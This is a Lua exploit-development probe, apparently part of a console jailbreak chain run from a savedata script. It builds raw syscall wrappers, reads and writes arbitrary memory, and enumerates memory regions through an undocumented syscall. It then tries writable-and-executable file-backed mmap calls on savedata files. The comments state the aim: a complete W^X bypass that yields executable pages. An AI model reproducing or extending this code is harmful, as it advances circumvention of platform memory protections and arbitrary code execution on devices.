-- CRASH_CLASS: HIGH
-- PROBE 803i: does a file-backed mapping keep the X bit that anonymous mappings lose?
--
-- 803h proved mmap strips bit 2 (X) for every anonymous prot value, so max_protection never
-- carries X and 548's protect cannot add it back.  If the stripping is anon-only, a file-backed
-- mapping is the remaining route to an executable page; a writable+executable one over a
-- savedata file would be a complete W^X bypass.
print("=== PROBE 803i: FILE-BACKED MMAP AND THE X BIT ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function rdb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) % 256 end
    return nil
end
local function wrb(a, v) return pcall(function() memory.write_byte(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function ascii(a, n)
    local out = ""
    for i = 0, n - 1 do
        local b = rdb(a + i) or 0
        if b == 0 then break end
        if b >= 32 and b < 127 then out = out .. string.char(b) else out = out .. "." end
    end
    return out
end
local function cstr(s)
    local b = memory.alloc(#s + 1)
    for i = 1, #s do wrb(b + i - 1, s:byte(i)) end
    wrb(b + #s, 0)
    return b
end
local getpid = make_syscall(20)
local sc674 = make_syscall(674)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_read = make_syscall(3)
pcall(function() return getpid() end)
local STRIDE, MAX = 72, 512
local regions = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, 0x400, 4 do wd(regions + i, 0) end
local countp = memory.alloc(16)
local function region_of(va)
    wq(countp, uint64(0))
    local ok = pcall(function()
        return sc674(uint64(regions), uint64(STRIDE), uint64(MAX), uint64(countp), uint64(0x40000000))
    end)
    if not ok then return nil end
    local n = rd(countp) or 0
    if n > MAX then n = MAX end
    for i = 0, n - 1 do
        local b = regions + i * STRIDE
        local lo = (rd(b) or 0) + (rd(b + 4) or 0) * 4294967296
        local hi = (rd(b + 8) or 0) + (rd(b + 12) or 0) * 4294967296
        if va >= lo and va < hi then return lo, hi, rd(b + 0x18) or 0, ascii(b + 0x20, 0x18) end
    end
    return nil
end
local function openf(path, flags, mode)
    local p = cstr(path)
    local ok, rv = pcall(function() return sc_open(uint64(p), uint64(flags), uint64(mode)) end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end
local paths = {"/savedata0/thread.lua", "/savedata0/main.lua", "/app0/sce_sys/param.sfo"}
print("[A] opening candidate files")
local fds = {}
for _, p in ipairs(paths) do
    local fd = openf(p, 0, 0)
    print(string.format("  open %-28s -> %s", p, tostring(fd)))
    if type(fd) == "number" and fd >= 0 then fds[#fds + 1] = {p, fd} end
end
print("")
print("[B] file-backed mappings")
local i = 0
for _, ent in ipairs(fds) do
    for _, pr in ipairs({3, 5, 7, 0x33, 0x37}) do
        for _, fl in ipairs({0x1002, 0x1001}) do
            i = i + 1
            local a = 0x780000000 + i * 0x20000
            pcall(function() return sc_munmap(uint64(a), uint64(0x4000)) end)
            local ok, rv = pcall(function()
                return sc_mmap(uint64(a), uint64(0x4000), uint64(pr), uint64(fl), uint64(ent[2]), uint64(0))
            end)
            local r = ok and to_num(rv) or -999
            local _, _, p = region_of(a)
            print(string.format("  %-24s prot=%02X flags=%X ret=%-4s stored=%s", ent[1], pr, fl,
                tostring(r), p and string.format("%02X", p) or "GONE"))
        end
    end
    pcall(function() return sc_close(uint64(ent[2])) end)
end
print("")
print("[Z] alive pid=" .. to_num(getpid()))
